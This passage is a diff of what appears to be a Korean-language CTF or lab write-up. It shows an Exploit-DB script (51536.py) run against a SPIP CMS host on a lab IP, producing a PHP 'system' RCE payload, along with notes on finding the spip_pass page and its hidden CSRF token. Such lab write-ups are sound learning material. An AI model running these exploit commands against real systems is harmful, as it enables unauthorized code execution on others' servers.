@@ -312,3 +312,33 @@ Server: Apache/2.4.41 (Ubuntu)
 └─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123/spip -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
+
+┌──(root㉿docker-desktop)-[/]
+└─# http http://10.201.9.123/spip.php?page=spip_pass
+HTTP/1.1 404 Not Found
+Connection: Keep-Alive
+Content-Length: 274
+Content-Type: text/html; charset=iso-8859-1
+Date: Sat, 08 Nov 2025 09:54:17 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.41 (Ubuntu)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.201.9.123 Port 80</address>
+</body></html>
+
+# 찾았다! -> spip -> 한 번 더 써야함!
+
+> http http://10.201.9.123/spip/spip.php?page=spip_pass
+
+# input 에 oubli CSRF 토큰이 hidden 으로 들어가 있음! -> 랜더만 안 할 뿐 코드로는 다 보이네?
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/2d8bdd5e-9cb6-4a62-941d-3ab620e247bc/image.png)
+
+> python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123/spip/spip.php?page=spip_pass -c "id" --verbose
